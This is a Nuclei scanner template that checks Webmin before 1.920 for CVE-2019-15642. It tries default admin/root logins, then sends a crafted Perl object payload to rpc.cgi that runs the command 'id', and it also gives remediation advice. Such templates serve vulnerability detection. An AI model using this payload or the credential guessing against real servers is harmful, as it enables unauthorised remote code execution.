http:
- attack: pitchfork
  host-redirects: true
  matchers:
  - part: body_2
    regex:
    - uid=(\d+)\(.*?\) gid=(\d+)\(.*?\) groups=(\d+)\(.*?\)
    type: regex
  - part: body_2
    type: word
    words:
    - 'Content-type: text/plain'
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    password:
    - admin
    - root
    username:
    - admin
    - root
  raw:
  - 'POST /session_login.cgi HTTP/1.1

    Host: {{Hostname}}

    Cookie: redirect=1; testing=1

    Origin: {{RootURL}}

    Content-Type: application/x-www-form-urlencoded

    Referer: {{RootURL}}

    Accept-Encoding: gzip, deflate


    user={{username}}&pass={{password}}

    '
  - 'POST /rpc.cgi HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    Referer: {{RootURL}}/sysinfo.cgi?xnavigation=1

    Accept-Encoding: gzip, deflate


    OBJECT Socket;print "Content-Type: text/plain\n\n";$cmd={{cmd}};print "$cmd\n\n";

    '
  stop-at-first-match: true
id: CVE-2019-15642
info:
  author: pussycat0x
  classification:
    cpe: cpe:2.3:a:webmin:webmin:*:*:*:*:*:*:*:*
    cve-id: CVE-2019-15642
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cwe-id: CWE-94
    epss-percentile: 0.9605
    epss-score: 0.22278
  description: 'rpc.cgi in Webmin through 1.920 allows authenticated Remote Code Execution
    via a crafted object name because unserialise_variable makes an eval call. NOTE:
    the Webmin_Servers_Index documentation states "RPC can be used to run any command
    or modify any file on a server, which is why access to it must not be granted
    to un-trusted Webmin users."

    '
  impact: 'Successful exploitation of this vulnerability allows an authenticated attacker
    to execute arbitrary code on the target system.

    '
  metadata:
    max-request: 4
    product: webmin
    shodan-query: title:"Webmin"
    vendor: webmin
    verified: true
  name: Webmin < 1.920 - Authenticated Remote Code Execution
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2019-15642
  - https://github.com/jas502n/CVE-2019-15642
  - https://doxfer.webmin.com/Webmin/Webmin_Servers_Index
  - https://github.com/webmin/webmin/blob/ab5e00e41ea1ecc1e24b8f8693f3495a0abb1aed/rpc.cgi#L26-L37
  - https://github.com/webmin/webmin/commit/df8a43fb4bdc9c858874f72773bcba597ae9432c
  remediation: 'Upgrade Webmin to version 1.920 or later to mitigate this vulnerability.

    '
  severity: high
  tags: cve,cve2019,webmin,rce
variables:
  cmd: '`id`'
